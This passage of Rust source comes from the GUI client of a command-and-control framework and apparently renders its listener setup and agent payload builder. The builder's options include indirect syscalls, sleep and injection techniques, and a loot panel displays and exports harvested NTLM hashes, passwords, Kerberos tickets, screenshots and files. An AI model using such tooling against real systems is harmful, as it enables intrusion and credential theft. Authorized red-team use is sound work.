                AppPhase::Login(LoginState::new(&self.cli_server_url, &self.local_config));
            let old_phase = std::mem::replace(&mut self.phase, placeholder);
            if let AppPhase::Authenticating { mut login_state, .. } = old_phase {
                login_state.set_error(error_msg);
                if let Some(failure) = tls_failure {
                    login_state.set_tls_failure(failure);
                }
                self.outgoing_tx = None;
                self.phase = AppPhase::Login(login_state);
            }
        }
    }

    fn render_listeners_panel(&mut self, ui: &mut egui::Ui, state: &AppState) {
        // ── Table ───────────────────────────────────────────────────
        let col_widths = [120.0_f32, 80.0, 120.0, 70.0, 70.0, 80.0];
        let headers = ["Name", "Protocol", "Host", "PortBind", "PortConn", "Status"];

        // Header row
        ui.horizontal(|ui| {
            for (header, &width) in headers.iter().zip(&col_widths) {
                ui.add_sized(
                    [width, 18.0],
                    egui::Label::new(
                        RichText::new(*header).strong().color(Color32::from_rgb(180, 180, 200)),
                    ),
                );
            }
        });
        ui.separator();

        // Body
        egui::ScrollArea::vertical().id_salt("listeners_table_scroll").show(ui, |ui| {
            if state.listeners.is_empty() {
                ui.label(RichText::new("No listeners configured.").weak());
            } else {
                for listener in &state.listeners {
                    let is_selected =
                        self.session_panel.selected_listener.as_deref() == Some(&listener.name);

                    let row_bg = if is_selected {
                        Color32::from_rgb(50, 50, 80)
                    } else {
                        Color32::TRANSPARENT
                    };

                    let response = egui::Frame::default()
                        .fill(row_bg)
                        .inner_margin(egui::Margin::symmetric(0, 1))
                        .show(ui, |ui| {
                            ui.horizontal(|ui| {
                                ui.add_sized(
                                    [col_widths[0], 16.0],
                                    egui::Label::new(RichText::new(&listener.name)),
                                );
                                ui.add_sized(
                                    [col_widths[1], 16.0],
                                    egui::Label::new(RichText::new(&listener.protocol)),
                                );
                                ui.add_sized(
                                    [col_widths[2], 16.0],
                                    egui::Label::new(RichText::new(&listener.host)),
                                );
                                ui.add_sized(
                                    [col_widths[3], 16.0],
                                    egui::Label::new(RichText::new(&listener.port_bind)),
                                );
                                ui.add_sized(
                                    [col_widths[4], 16.0],
                                    egui::Label::new(RichText::new(&listener.port_conn)),
                                );
                                let status_color = if listener.status.contains("Online") {
                                    Color32::from_rgb(110, 199, 141) // green
                                } else {
                                    Color32::from_rgb(230, 80, 80) // red (offline/error)
                                };
                                ui.add_sized(
                                    [col_widths[5], 16.0],
                                    egui::Label::new(
                                        RichText::new(&listener.status).color(status_color),
                                    ),
                                );
                            });
                        })
                        .response;

                    if response.interact(Sense::click()).clicked() {
                        self.session_panel.selected_listener = Some(listener.name.clone());
                    }
                }
            }
        });

        ui.add_space(4.0);
        ui.separator();

        // ── Action buttons ──────────────────────────────────────────
        ui.horizontal(|ui| {
            if ui.button("Add").clicked() {
                self.session_panel.listener_dialog = Some(ListenerDialogState::new_create());
            }
            let has_selection = self.session_panel.selected_listener.is_some();
            if ui.add_enabled(has_selection, egui::Button::new("Remove")).clicked() {
                if let Some(name) = self.session_panel.selected_listener.take() {
                    let operator = state
                        .operator_info
                        .as_ref()
                        .map(|op| op.username.as_str())
                        .unwrap_or_default();
                    self.session_panel
                        .pending_messages
                        .push(build_listener_remove(&name, operator));
                }
            }
            if ui.add_enabled(has_selection, egui::Button::new("Edit")).clicked() {
                // For Edit we re-open the dialog pre-filled; since we only store
                // summary data locally, we populate from the summary and let the
                // operator change what the server allows.
                if let Some(name) = &self.session_panel.selected_listener {
                    if let Some(listener) = state.listeners.iter().find(|l| &l.name == name) {
                        let info = ListenerInfo {
                            host_bind: Some(listener.host.clone()),
                            port_bind: Some(listener.port_bind.clone()),
                            ..ListenerInfo::default()
                        };
                        self.session_panel.listener_dialog = Some(ListenerDialogState::new_edit(
                            &listener.name,
                            &listener.protocol,
                            &info,
                        ));
                    }
                }
            }
        });
    }

    /// Render the Create/Edit Listener dialog as an egui window overlay.
    fn render_listener_dialog(&mut self, ctx: &egui::Context, state: &AppState) {
        let Some(dialog) = &mut self.session_panel.listener_dialog else {
            return;
        };

        let title = match dialog.mode {
            ListenerDialogMode::Create => "Create Listener",
            ListenerDialogMode::Edit => "Edit Listener",
        };

        let mut close_requested = false;
        let mut save_clicked = false;

        egui::Window::new(title)
            .collapsible(false)
            .resizable(true)
            .default_width(480.0)
            .default_height(520.0)
            .anchor(Align2::CENTER_CENTER, [0.0, 0.0])
            .show(ctx, |ui| {
                egui::Grid::new("listener_dialog_grid").num_columns(2).spacing([8.0, 6.0]).show(
                    ui,
                    |ui| {
                        ui.label("Name:");
                        let name_editable = dialog.mode == ListenerDialogMode::Create;
                        ui.add_enabled(
                            name_editable,
                            egui::TextEdit::singleline(&mut dialog.name).desired_width(300.0),
                        );
                        ui.end_row();

                        ui.label("Payload:");
                        egui::ComboBox::from_id_salt("listener_protocol_combo")
                            .selected_text(dialog.protocol.label())
                            .width(300.0)
                            .show_ui(ui, |ui| {
                                for proto in ListenerProtocol::ALL {
                                    ui.selectable_value(&mut dialog.protocol, proto, proto.label());
                                }
                            });
                        ui.end_row();
                    },
                );

                ui.add_space(8.0);
                ui.heading("Config Options");
                ui.separator();

                match dialog.protocol {
                    ListenerProtocol::Http | ListenerProtocol::Https => {
                        Self::render_http_listener_fields(ui, dialog);
                    }
                    ListenerProtocol::Smb => {
                        egui::Grid::new("smb_fields").num_columns(2).spacing([8.0, 6.0]).show(
                            ui,
                            |ui| {
                                ui.label("Pipe Name:");
                                ui.add(
                                    egui::TextEdit::singleline(&mut dialog.pipe_name)
                                        .desired_width(300.0),
                                );
                                ui.end_row();
                            },
                        );
                    }
                    ListenerProtocol::External => {
                        egui::Grid::new("external_fields").num_columns(2).spacing([8.0, 6.0]).show(
                            ui,
                            |ui| {
                                ui.label("Endpoint:");
                                ui.add(
                                    egui::TextEdit::singleline(&mut dialog.endpoint)
                                        .desired_width(300.0),
                                );
                                ui.end_row();
                            },
                        );
                    }
                }

                ui.add_space(12.0);
                ui.separator();
                ui.horizontal(|ui| {
                    if ui.button("Save").clicked() {
                        save_clicked = true;
                    }
                    if ui.button("Close").clicked() {
                        close_requested = true;
                    }
                });
            });

        if save_clicked {
            if let Some(dialog) = &self.session_panel.listener_dialog {
                let operator =
                    state.operator_info.as_ref().map(|op| op.username.as_str()).unwrap_or_default();
                let info = dialog.to_listener_info();
                let message = match dialog.mode {
                    ListenerDialogMode::Create => build_listener_new(info, operator),
                    ListenerDialogMode::Edit => build_listener_edit(info, operator),
                };
                self.session_panel.pending_messages.push(message);
            }
            self.session_panel.listener_dialog = None;
        } else if close_requested {
            self.session_panel.listener_dialog = None;
        }
    }

    /// Render the HTTP/HTTPS-specific config fields inside the listener dialog.
    fn render_http_listener_fields(ui: &mut egui::Ui, dialog: &mut ListenerDialogState) {
        egui::Grid::new("http_fields").num_columns(2).spacing([8.0, 6.0]).show(ui, |ui| {
            ui.label("Host:");
            ui.add(egui::TextEdit::singleline(&mut dialog.host).desired_width(300.0));
            ui.end_row();

            ui.label("Port:");
            ui.add(egui::TextEdit::singleline(&mut dialog.port).desired_width(300.0));
            ui.end_row();

            ui.label("User Agent:");
            ui.add(egui::TextEdit::singleline(&mut dialog.user_agent).desired_width(300.0));
            ui.end_row();

            ui.label("Headers:");
            ui.add(
                egui::TextEdit::multiline(&mut dialog.headers).desired_width(300.0).desired_rows(3),
            );
            ui.end_row();

            ui.label("Uris:");
            ui.add(
                egui::TextEdit::multiline(&mut dialog.uris).desired_width(300.0).desired_rows(3),
            );
            ui.end_row();

            ui.label("Host Header:");
            ui.add(egui::TextEdit::singleline(&mut dialog.host_header).desired_width(300.0));
            ui.end_row();
        });

        ui.checkbox(&mut dialog.proxy_enabled, "Enable Proxy Connection");

        if dialog.proxy_enabled {
            egui::Frame::default()
                .fill(Color32::from_rgb(30, 30, 50))
                .inner_margin(egui::Margin::same(8))
                .corner_radius(4.0)
                .show(ui, |ui| {
                    egui::Grid::new("proxy_fields").num_columns(2).spacing([8.0, 6.0]).show(
                        ui,
                        |ui| {
                            ui.label("Proxy Type:");
                            egui::ComboBox::from_id_salt("proxy_type_combo")
                                .selected_text(&dialog.proxy_type)
                                .width(300.0)
                                .show_ui(ui, |ui| {
                                    ui.selectable_value(
                                        &mut dialog.proxy_type,
                                        "http".to_owned(),
                                        "http",
                                    );
                                    ui.selectable_value(
                                        &mut dialog.proxy_type,
                                        "https".to_owned(),
                                        "https",
                                    );
                                });
                            ui.end_row();

                            ui.label("Proxy Host:");
                            ui.add(
                                egui::TextEdit::singleline(&mut dialog.proxy_host)
                                    .desired_width(300.0),
                            );
                            ui.end_row();

                            ui.label("Proxy Port:");
                            ui.add(
                                egui::TextEdit::singleline(&mut dialog.proxy_port)
                                    .desired_width(300.0),
                            );
                            ui.end_row();

                            ui.label("UserName:");
                            ui.add(
                                egui::TextEdit::singleline(&mut dialog.proxy_username)
                                    .desired_width(300.0),
                            );
                            ui.end_row();

                            ui.label("Password:");
                            ui.add(
                                egui::TextEdit::singleline(&mut *dialog.proxy_password)
                                    .desired_width(300.0)
                                    .password(true),
                            );
                            ui.end_row();
                        },
                    );
                });
        }
    }

    /// Render the Payload generation dialog (Attack > Payload).
    fn render_payload_dialog(
        &mut self,
        ctx: &egui::Context,
        state: &AppState,
        app_state: &SharedAppState,
    ) {
        let Some(dialog) = &mut self.session_panel.payload_dialog else {
            return;
        };

        let mut close_requested = false;
        let mut generate_clicked = false;
        let mut save_result: Option<PayloadBuildResult> = None;

        // Snapshot build console + payload response from shared state.
        let build_messages: Vec<BuildConsoleEntry> = state.build_console_messages.clone();
        let payload_result: Option<PayloadBuildResult> = state.last_payload_response.clone();

        egui::Window::new("Payload")
            .collapsible(false)
            .resizable(true)
            .default_width(520.0)
            .default_height(640.0)
            .anchor(Align2::CENTER_CENTER, [0.0, 0.0])
            .show(ctx, |ui| {
                // ── Agent type ──────────────────────────────────────
                egui::Grid::new("payload_agent_grid").num_columns(2).spacing([8.0, 6.0]).show(
                    ui,
                    |ui| {
                        ui.label("Agent:");
                        egui::ComboBox::from_id_salt("payload_agent_type")
                            .selected_text(&dialog.agent_type)
                            .width(360.0)
                            .show_ui(ui, |ui| {
                                ui.selectable_value(
                                    &mut dialog.agent_type,
                                    "Demon".to_owned(),
                                    "Demon",
                                );
                            });
                        ui.end_row();
                    },
                );

                // ── Options section ─────────────────────────────────
                ui.add_space(4.0);
                ui.label(RichText::new("Options").strong());
                ui.separator();

                egui::Grid::new("payload_options_grid").num_columns(2).spacing([8.0, 6.0]).show(
                    ui,
                    |ui| {
                        ui.label("Listener:");
                        let listener_names: Vec<String> =
                            state.listeners.iter().map(|l| l.name.clone()).collect();
                        let selected = if dialog.listener.is_empty() {
                            listener_names.first().cloned().unwrap_or_default()
                        } else {
                            dialog.listener.clone()
                        };
                        egui::ComboBox::from_id_salt("payload_listener")
                            .selected_text(&selected)
                            .width(360.0)
                            .show_ui(ui, |ui| {
                                for name in &listener_names {
                                    if ui.selectable_label(dialog.listener == *name, name).clicked()
                                    {
                                        dialog.listener = name.clone();
                                    }
                                }
                            });
                        ui.end_row();

                        ui.label("Arch:");
                        egui::ComboBox::from_id_salt("payload_arch")
                            .selected_text(dialog.arch.label())
                            .width(360.0)
                            .show_ui(ui, |ui| {
                                for arch in PayloadArch::ALL {
                                    ui.selectable_value(&mut dialog.arch, arch, arch.label());
                                }
                            });
                        ui.end_row();

                        ui.label("Format:");
                        egui::ComboBox::from_id_salt("payload_format")
                            .selected_text(dialog.format.label())
                            .width(360.0)
                            .show_ui(ui, |ui| {
                                for fmt in PayloadFormat::ALL {
                                    ui.selectable_value(&mut dialog.format, fmt, fmt.label());
                                }
                            });
                        ui.end_row();
                    },
                );

                // ── Config table ────────────────────────────────────
                ui.add_space(4.0);
                egui::Grid::new("payload_config_header").num_columns(2).spacing([8.0, 0.0]).show(
                    ui,
                    |ui| {
                        ui.strong("Config");
                        ui.strong("Value");
                        ui.end_row();
                    },
                );
                ui.separator();

                egui::Grid::new("payload_config_grid").num_columns(2).spacing([8.0, 4.0]).show(
                    ui,
                    |ui| {
                        ui.label("    Sleep");
                        ui.add(egui::TextEdit::singleline(&mut dialog.sleep).desired_width(200.0));
                        ui.end_row();

                        ui.label("    Jitter");
                        ui.add(egui::TextEdit::singleline(&mut dialog.jitter).desired_width(200.0));
                        ui.end_row();

                        ui.label("    Indirect Syscall");
                        ui.checkbox(&mut dialog.indirect_syscall, "");
                        ui.end_row();

                        ui.label("    Sleep Technique");
                        egui::ComboBox::from_id_salt("payload_sleep_tech")
                            .selected_text(dialog.sleep_technique.label())
                            .width(200.0)
                            .show_ui(ui, |ui| {
                                for tech in SleepTechnique::ALL {
                                    ui.selectable_value(
                                        &mut dialog.sleep_technique,
                                        tech,
                                        tech.label(),
                                    );
                                }
                            });
                        ui.end_row();
                    },
                );

                // ── Injection section ───────────────────────────────
                ui.add_space(4.0);
                ui.collapsing("Injection", |ui| {
                    egui::Grid::new("payload_injection_grid")
                        .num_columns(2)
                        .spacing([8.0, 4.0])
                        .show(ui, |ui| {
                            ui.label("Alloc");
                            egui::ComboBox::from_id_salt("payload_alloc")
                                .selected_text(dialog.alloc.label())
                                .width(200.0)
                                .show_ui(ui, |ui| {
                                    for m in AllocMethod::ALL {
                                        ui.selectable_value(&mut dialog.alloc, m, m.label());
                                    }
                                });
                            ui.end_row();

                            ui.label("Execute");
                            egui::ComboBox::from_id_salt("payload_execute")
                                .selected_text(dialog.execute.label())
                                .width(200.0)
                                .show_ui(ui, |ui| {
                                    for m in ExecuteMethod::ALL {
                                        ui.selectable_value(&mut dialog.execute, m, m.label());
                                    }
                                });
                            ui.end_row();

                            ui.label("Spawn64");
                            ui.add(
                                egui::TextEdit::singleline(&mut dialog.spawn64)
                                    .desired_width(280.0)
                                    .text_color(Color32::from_rgb(85, 255, 85)),
                            );
                            ui.end_row();

                            ui.label("Spawn32");
                            ui.add(
                                egui::TextEdit::singleline(&mut dialog.spawn32)
                                    .desired_width(280.0)
                                    .text_color(Color32::from_rgb(85, 255, 85)),
                            );
                            ui.end_row();
                        });
                });

                // ── Building Console ────────────────────────────────
                ui.add_space(8.0);
                ui.strong("Building Console");

                let console_height = 140.0;
                egui::Frame::NONE
                    .fill(Color32::from_rgb(20, 20, 30))
                    .inner_margin(6.0)
                    .corner_radius(4.0)
                    .show(ui, |ui| {
                        egui::ScrollArea::vertical()
                            .max_height(console_height)
                            .auto_shrink([false, false])
                            .stick_to_bottom(true)
                            .show(ui, |ui| {
                                if build_messages.is_empty() {
                                    ui.colored_label(
                                        Color32::from_rgb(100, 100, 100),
                                        "No build output yet.",
                                    );
                                } else {
                                    for entry in &build_messages {
                                        let color =
                                            build_console_message_color(&entry.message_type);
                                        let prefix =
                                            build_console_message_prefix(&entry.message_type);
                                        ui.colored_label(
                                            color,
                                            format!("{prefix} {}", entry.message),
                                        );
                                    }
                                }
                            });
                    });

                // ── Generate / Save / Close buttons ─────────────────
                ui.add_space(8.0);
                ui.separator();
                ui.horizontal(|ui| {
                    let can_generate = !dialog.building;
                    if ui.add_enabled(can_generate, egui::Button::new("Generate")).clicked() {
                        generate_clicked = true;
                    }
                    if let Some(result) = &payload_result {
                        if ui.button(format!("Save ({})", result.file_name)).clicked() {
                            save_result = Some(result.clone());
                        }
                    }
                    if ui.button("Close").clicked() {
                        close_requested = true;
                    }
                });
            });

        // ── Post-frame actions ──────────────────────────────────────
        if generate_clicked {
            if let Some(dialog) = &mut self.session_panel.payload_dialog {
                dialog.building = true;
                // Clear previous build state.
                match app_state.lock() {
                    Ok(mut s) => {
                        s.build_console_messages.clear();
                        s.last_payload_response = None;
                    }
                    Err(poisoned) => {
                        let mut s = poisoned.into_inner();
                        s.build_console_messages.clear();
                        s.last_payload_response = None;
                    }
                }
                let operator =
                    state.operator_info.as_ref().map(|op| op.username.as_str()).unwrap_or_default();
                let message = build_payload_request(dialog, operator);
                self.session_panel.pending_messages.push(message);
            }
        }

        if let Some(result) = save_result {
            if let Some(path) = FileDialog::new().set_file_name(&result.file_name).save_file() {
                if let Err(e) = std::fs::write(&path, &result.payload_bytes) {
                    self.session_panel.status_message =
                        Some(format!("Failed to save payload: {e}"));
                } else {
                    self.session_panel.status_message =
                        Some(format!("Payload saved to {}", path.display()));
                }
            }
        }

        if close_requested {
            self.session_panel.payload_dialog = None;
            // Clear build state when closing the dialog.
            match app_state.lock() {
                Ok(mut s) => {
                    s.build_console_messages.clear();
                    s.last_payload_response = None;
                }
                Err(poisoned) => {
                    let mut s = poisoned.into_inner();
                    s.build_console_messages.clear();
                    s.last_payload_response = None;
                }
            }
        }

        // Mark building as done when we have a response or build is done.
        if payload_result.is_some() {
            if let Some(dialog) = &mut self.session_panel.payload_dialog {
                dialog.building = false;
            }
        }
    }

    fn render_loot_panel(&mut self, ui: &mut egui::Ui, state: &AppState) {
        // ── Header with sub-tabs ───────────────────────────────────────
        ui.horizontal(|ui| {
            ui.heading("Loot");
            ui.add_space(16.0);
            for (tab, label) in [
                (LootTab::Credentials, "Credentials"),
                (LootTab::Screenshots, "Screenshots"),
                (LootTab::Files, "Files"),
            ] {
                let active = self.session_panel.loot_panel.active_tab == tab;
                let text = if active {
                    RichText::new(label).strong().color(Color32::WHITE)
                } else {
                    RichText::new(label).color(Color32::from_rgb(160, 160, 170))
                };
                let frame = if active {
                    egui::Frame::default()
                        .fill(Color32::from_rgb(40, 42, 54))
                        .stroke(Stroke::new(1.0, Color32::from_rgb(220, 130, 60)))
                        .inner_margin(egui::Margin::symmetric(8, 3))
                } else {
                    egui::Frame::default()
                        .fill(Color32::from_rgb(30, 30, 46))
                        .inner_margin(egui::Margin::symmetric(8, 3))
                };
                if frame.show(ui, |ui| ui.label(text)).response.clicked() {
                    self.session_panel.loot_panel.active_tab = tab;
                }
            }
        });
        ui.separator();

        // ── Common filter bar ──────────────────────────────────────────
        ui.horizontal_wrapped(|ui| {
            // Show sub-filter only when relevant to the active tab.
            match self.session_panel.loot_panel.active_tab {
                LootTab::Credentials => {
                    ui.label("Category");
                    egui::ComboBox::from_id_salt("loot-cred-filter")
                        .selected_text(match self.session_panel.loot_cred_filter {
                            CredentialSubFilter::All => "All",
                            CredentialSubFilter::NtlmHash => "NTLM Hash",
                            CredentialSubFilter::Plaintext => "Plaintext Password",
                            CredentialSubFilter::KerberosTicket => "Kerberos Ticket",
                            CredentialSubFilter::Certificate => "Certificate",
                        })
                        .show_ui(ui, |ui| {
                            for (value, label) in CredentialSubFilter::ALL {
                                ui.selectable_value(
                                    &mut self.session_panel.loot_cred_filter,
                                    value,
                                    label,
                                );
                            }
                        });
                }
                LootTab::Files => {
                    ui.label("Category");
                    egui::ComboBox::from_id_salt("loot-file-filter")
                        .selected_text(match self.session_panel.loot_file_filter {
                            FileSubFilter::All => "All",
                            FileSubFilter::Document => "Document",
                            FileSubFilter::Archive => "Archive",
                            FileSubFilter::Binary => "Binary",
                        })
                        .show_ui(ui, |ui| {
                            for (value, label) in FileSubFilter::ALL {
                                ui.selectable_value(
                                    &mut self.session_panel.loot_file_filter,
                                    value,
                                    label,
                                );
                            }
                        });
                }
                LootTab::Screenshots => {}
            }

            ui.label("Agent");
            ui.add(
                egui::TextEdit::singleline(&mut self.session_panel.loot_agent_filter)
                    .desired_width(84.0)
                    .hint_text("ABCD1234"),
            );
            ui.label("Since");
            ui.add(
                egui::TextEdit::singleline(&mut self.session_panel.loot_since_filter)
                    .desired_width(100.0)
                    .hint_text("2026-03-01"),
            );
            ui.label("Until");
            ui.add(
                egui::TextEdit::singleline(&mut self.session_panel.loot_until_filter)
                    .desired_width(100.0)
                    .hint_text("2026-03-31"),
            );
        });
        ui.add(
            egui::TextEdit::singleline(&mut self.session_panel.loot_text_filter)
                .hint_text("Search name, path, source, preview"),
        );

        if let Some(message) = &self.session_panel.loot_status_message {
            ui.add_space(4.0);
            ui.label(RichText::new(message).weak());
        }
        ui.add_space(4.0);

        // ── Build the type filter matching the active tab ──────────────
        let type_filter = match self.session_panel.loot_panel.active_tab {
            LootTab::Credentials => LootTypeFilter::Credentials,
            LootTab::Screenshots => LootTypeFilter::Screenshots,
            LootTab::Files => LootTypeFilter::Files,
        };

        let filtered_loot: Vec<_> = state
            .loot
            .iter()
            .filter(|item| {
                loot_matches_filters(
                    item,
                    type_filter,
                    self.session_panel.loot_cred_filter,
                    self.session_panel.loot_file_filter,
                    &self.session_panel.loot_agent_filter,
                    &self.session_panel.loot_since_filter,
                    &self.session_panel.loot_until_filter,
                    &self.session_panel.loot_text_filter,
                )
            })
            .collect();

        // ── Export bar ─────────────────────────────────────────────────
        ui.horizontal(|ui| {
            ui.label(format!("{} item(s)", filtered_loot.len()));
            if ui.button("Export CSV").clicked() {
                self.session_panel.loot_status_message =
                    Some(export_loot_csv(&filtered_loot).unwrap_or_else(|e| e));
            }
            if ui.button("Export JSON").clicked() {
                self.session_panel.loot_status_message =
                    Some(export_loot_json(&filtered_loot).unwrap_or_else(|e| e));
            }
        });
        ui.add_space(4.0);

        // ── Tab content ────────────────────────────────────────────────
        match self.session_panel.loot_panel.active_tab {
            LootTab::Credentials => self.render_loot_credentials(ui, &filtered_loot),
            LootTab::Screenshots => self.render_loot_screenshots(ui, &filtered_loot),
            LootTab::Files => self.render_loot_files(ui, &filtered_loot),
        }
    }

    /// Render the credential table inside the Loot panel.
    fn render_loot_credentials(&mut self, ui: &mut egui::Ui, items: &[&LootItem]) {
        if items.is_empty() {
            ui.label("No credentials collected yet.");
            return;
        }

        // Sort items according to selected column.
        let mut sorted: Vec<&LootItem> = items.to_vec();
        let desc = self.session_panel.loot_panel.cred_sort_desc;
        sorted.sort_by(|a, b| {
            let ordering = match self.session_panel.loot_panel.cred_sort_column {
                CredentialSortColumn::Name => a.name.cmp(&b.name),
                CredentialSortColumn::Agent => a.agent_id.cmp(&b.agent_id),
                CredentialSortColumn::Category => {
                    loot_sub_category_label(a).cmp(loot_sub_category_label(b))
                }
                CredentialSortColumn::Source => a.source.cmp(&b.source),
                CredentialSortColumn::Time => a.collected_at.cmp(&b.collected_at),
            };
            if desc { ordering.reverse() } else { ordering }
        });

        let header_color = Color32::from_rgb(180, 180, 190);
        let row_bg_a = Color32::from_rgb(30, 30, 46);
        let row_bg_b = Color32::from_rgb(36, 36, 52);

        egui::ScrollArea::both().show(ui, |ui| {
            egui::Grid::new("loot-cred-table")
                .num_columns(6)
                .striped(false)
                .min_col_width(60.0)
                .spacing([8.0, 2.0])
                .show(ui, |ui| {
                    // Header row.
                    let columns = [
                        (CredentialSortColumn::Name, "Name"),
                        (CredentialSortColumn::Category, "Type"),
                        (CredentialSortColumn::Agent, "Agent"),
                        (CredentialSortColumn::Source, "Source"),
                        (CredentialSortColumn::Time, "Collected"),
                    ];
                    for (col, label) in columns {
                        let active = self.session_panel.loot_panel.cred_sort_column == col;
                        let arrow = if active {
                            if self.session_panel.loot_panel.cred_sort_desc { " v" } else { " ^" }
                        } else {
                            ""
                        };
                        let text =
                            RichText::new(format!("{label}{arrow}")).strong().color(header_color);
                        if ui.label(text).clicked() {
                            if self.session_panel.loot_panel.cred_sort_column == col {
                                self.session_panel.loot_panel.cred_sort_desc =
                                    !self.session_panel.loot_panel.cred_sort_desc;
                            } else {
                                self.session_panel.loot_panel.cred_sort_column = col;
                                self.session_panel.loot_panel.cred_sort_desc = false;
                            }
                        }
                    }
                    // Value column is not sortable.
                    ui.label(RichText::new("Value / Preview").strong().color(header_color));
                    ui.end_row();

                    // Data rows.
                    for (index, item) in sorted.iter().enumerate() {
                        let bg = if index % 2 == 0 { row_bg_a } else { row_bg_b };
                        let _ = bg; // Row striping via frame below.
                        ui.label(&item.name);
                        ui.label(
                            RichText::new(loot_sub_category_label(item))
                                .small()
                                .color(credential_category_color(item)),
                        );
                        ui.monospace(&item.agent_id);
                        ui.label(&item.source);
                        ui.label(blank_if_empty(&item.collected_at, "-"));
                        // Preview / value (monospace, truncated).
                        if let Some(preview) = &item.preview {
                            let display = if preview.len() > 80 {
                                format!("{}...", &preview[..77])
                            } else {
                                preview.clone()
                            };
                            ui.label(
                                RichText::new(display)
                                    .monospace()
                                    .color(Color32::from_rgb(110, 199, 141)),
                            );
                        } else {
                            ui.label("-");
                        }
                        ui.end_row();
                    }
                });
        });
    }

    /// Render the screenshot gallery inside the Loot panel.
    fn render_loot_screenshots(&mut self, ui: &mut egui::Ui, items: &[&LootItem]) {
        if items.is_empty() {
            ui.label("No screenshots captured yet.");
            return;
        }

        // Clamp selected index.
        if let Some(sel) = self.session_panel.loot_panel.selected_screenshot {
            if sel >= items.len() {
                self.session_panel.loot_panel.selected_screenshot = None;
            }
        }

        // If a screenshot is selected, show detail view.
        if let Some(selected_idx) = self.session_panel.loot_panel.selected_screenshot {
            let item = items[selected_idx];
            ui.horizontal(|ui| {
                if ui.button("<< Back to gallery").clicked() {
                    self.session_panel.loot_panel.selected_screenshot = None;
                }
                ui.add_space(8.0);
                ui.label(RichText::new(&item.name).strong());
                if !item.agent_id.is_empty() {
                    ui.monospace(format!("[{}]", item.agent_id));
                }
                ui.label(format!("  {}", blank_if_empty(&item.collected_at, "unknown")));
                if loot_is_downloadable(item) && ui.button("Save").clicked() {
                    self.session_panel.loot_status_message =
                        Some(download_loot_item(item).unwrap_or_else(|e| e));
                }
            });
            ui.separator();

            // Render the screenshot image.
            egui::ScrollArea::both().show(ui, |ui| {
                if let Some(texture) = self.ensure_screenshot_texture(ui.ctx(), item) {
                    let size = texture.size_vec2();
                    let available = ui.available_size();
                    let scale = (available.x / size.x).min(available.y / size.y).min(1.0);
                    let scaled = size * scale;
                    ui.add(egui::Image::from_texture(&texture).fit_to_exact_size(scaled));
                } else {
                    ui.label(
                        RichText::new("Unable to decode screenshot image.")
                            .color(Color32::from_rgb(220, 80, 80)),
                    );
                }
            });
            return;
        }

        // Thumbnail grid view.
        let thumb_size = 200.0_f32;
        egui::ScrollArea::vertical().show(ui, |ui| {
            let available_width = ui.available_width();
            let cols = ((available_width / (thumb_size + 12.0)) as usize).max(1);
            egui::Grid::new("loot-screenshot-grid").num_columns(cols).spacing([8.0, 8.0]).show(
                ui,
                |ui| {
                    for (index, item) in items.iter().enumerate() {
                        let frame = egui::Frame::default()
                            .fill(Color32::from_rgb(30, 30, 46))
                            .stroke(Stroke::new(1.0, Color32::from_rgb(60, 60, 80)))
                            .inner_margin(egui::Margin::same(4));
                        let response = frame
                            .show(ui, |ui| {
                                ui.set_width(thumb_size);
                                if let Some(texture) =
                                    self.ensure_screenshot_texture(ui.ctx(), item)
                                {
                                    let img_size = texture.size_vec2();
                                    let scale =
                                        (thumb_size / img_size.x).min(thumb_size / img_size.y);
                                    let scaled = img_size * scale;
                                    ui.add(
                                        egui::Image::from_texture(&texture)
                                            .fit_to_exact_size(scaled),
                                    );
                                } else {
                                    ui.allocate_space(egui::vec2(thumb_size, thumb_size * 0.6));
                                    ui.label(
                                        RichText::new("[decode error]")
                                            .small()
                                            .color(Color32::from_rgb(180, 80, 80)),
                                    );
                                }
                                ui.label(RichText::new(&item.name).small().strong());
                                ui.label(
                                    RichText::new(format!(
                                        "{} | {}",
                                        blank_if_empty(&item.agent_id, "?"),
                                        blank_if_empty(&item.collected_at, "?"),
                                    ))
                                    .small()
                                    .color(Color32::GRAY),
                                );
                            })
                            .response;
                        if response.clicked() {
                            self.session_panel.loot_panel.selected_screenshot = Some(index);
                        }
                        if (index + 1) % cols == 0 {
                            ui.end_row();
                        }
                    }
                },
            );
        });
    }

    /// Render the file downloads table inside the Loot panel.
    fn render_loot_files(&mut self, ui: &mut egui::Ui, items: &[&LootItem]) {
        if items.is_empty() {
            ui.label("No files downloaded yet.");
            return;
        }

        let header_color = Color32::from_rgb(180, 180, 190);

        egui::ScrollArea::both().show(ui, |ui| {
            egui::Grid::new("loot-files-table")
                .num_columns(7)
                .striped(false)
                .min_col_width(50.0)
                .spacing([8.0, 2.0])
                .show(ui, |ui| {
                    // Header.
                    for label in ["Name", "Category", "Agent", "Path", "Size", "Collected", ""] {
                        ui.label(RichText::new(label).strong().color(header_color));
                    }
                    ui.end_row();

                    // Rows.
                    for item in items {
                        ui.label(&item.name);
                        ui.label(
                            RichText::new(loot_sub_category_label(item))
                                .small()
                                .color(Color32::GRAY),
                        );
                        ui.monospace(&item.agent_id);
                        ui.label(item.file_path.as_deref().unwrap_or("-"));
                        ui.label(item.size_bytes.map(human_size).unwrap_or_else(|| "-".to_owned()));
                        ui.label(blank_if_empty(&item.collected_at, "-"));
                        if loot_is_downloadable(item) {
                            if ui.button("Save").clicked() {
                                self.session_panel.loot_status_message =
                                    Some(download_loot_item(item).unwrap_or_else(|e| e));
                            }
                        } else {
                            ui.label("");
                        }
                        ui.end_row();
                    }
                });
        });
    }

    /// Decode and cache a screenshot texture for the given loot item.
    ///
    /// Returns `None` if the item has no image content or decoding fails.
    fn ensure_screenshot_texture(
        &mut self,
        ctx: &egui::Context,
        item: &LootItem,
    ) -> Option<egui::TextureHandle> {
        let id = item.id.unwrap_or(-1);
        if let Some(handle) = self.session_panel.screenshot_textures.inner.get(&id) {
            return Some(handle.clone());
        }
        let encoded = item.content_base64.as_deref()?;
        let bytes = base64::engine::general_purpose::STANDARD.decode(encoded).ok()?;
        let img = image::load_from_memory(&bytes).ok()?.to_rgba8();
        let (w, h) = img.dimensions();
        let color_image =
            egui::ColorImage::from_rgba_unmultiplied([w as usize, h as usize], img.as_raw());
        let texture = ctx.load_texture(
            format!("loot-screenshot-{id}"),
            color_image,
            egui::TextureOptions::LINEAR,
        );
        self.session_panel.screenshot_textures.inner.insert(id, texture.clone());
        Some(texture)
    }

    fn render_chat_panel(&mut self, ui: &mut egui::Ui, state: &AppState) {
        ui.horizontal(|ui| {
            ui.heading("Events & Chat");

            let unread = state.event_log.unread_count;
            if unread > 0 {
                ui.label(
                    RichText::new(format!("  {unread} unread"))
